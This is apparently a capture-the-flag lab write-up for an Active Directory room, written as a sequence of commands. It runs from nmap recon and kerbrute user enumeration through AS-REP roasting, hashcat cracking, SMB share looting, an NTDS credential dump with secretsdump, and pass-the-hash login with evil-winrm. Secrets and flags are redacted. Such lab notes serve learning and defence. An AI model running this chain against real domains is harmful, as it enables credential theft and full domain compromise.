# Attacktive Directory — Quick Notes

## Target Context

- Target IP: `10.64.145.19`
- AD domain: `spookysec.local`
- Host: `AttacktiveDirectory.spookysec.local`
- Platform: Windows Active Directory

## Recon

```bash
nmap -Pn -A -p- -T4 10.64.145.19
```

Key ports observed: 53, 80, 88, 135, 139, 389, 445, 464, 636, 3268, 3269, 3389, 5985, 9389, 47001 and dynamic RPC ports.

## Domain Discovery

```bash
crackmapexec smb 10.64.145.19
```

Domain: `spookysec.local`

## User Enumeration

```bash
kerbrute userenum -d spookysec.local --dc 10.64.145.19 users.txt
```

Notable identities included `svc-admin`, `backup`, `administrator` and several named users.

## AS-REP Roasting

```bash
python3.9 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -dc-ip 10.64.145.19 -usersfile valid_users.txt -request
```

Vulnerable principal: `svc-admin`.

## Offline Recovery

```bash
hashcat -m 18200 Hash.txt passwords.txt
```

Recovered service-account password is intentionally omitted from public notes.

## SMB

```bash
netexec smb 10.64.145.19 -u 'svc-admin' -p '<REDACTED>' --shares
smbclient //10.64.145.19/backup -U 'svc-admin'
```

Interesting file: `backup_credentials.txt`.

## Credential Artifact

The file contained Base64-encoded credential material. The decoded backup credential is intentionally omitted.

## NTDS Extraction

```bash
secretsdump.py spookysec.local/backup:<REDACTED>@10.64.145.19
```

The room demonstrated DRSUAPI-based directory replication access and NTDS credential extraction.

## Pass-the-Hash

```bash
evil-winrm -i 10.64.145.19 -u 'Administrator' -H '<REDACTED_NTLM_HASH>'
```

## Flags

Flag values are intentionally hidden. Locations:

- `C:\Users\svc-admin\Desktop\user.txt.txt`
- `C:\Users\backup\Desktop\PrivEsc.txt`
- `C:\Users\Administrator\Desktop\root.txt`

## Concepts to Review

- Kerberos preauthentication
- AS-REP roasting
- SMB share permissions
- Active Directory replication rights
- DRSUAPI
- NTDS credential material
- NTLM hashes
- Pass-the-hash
- WinRM
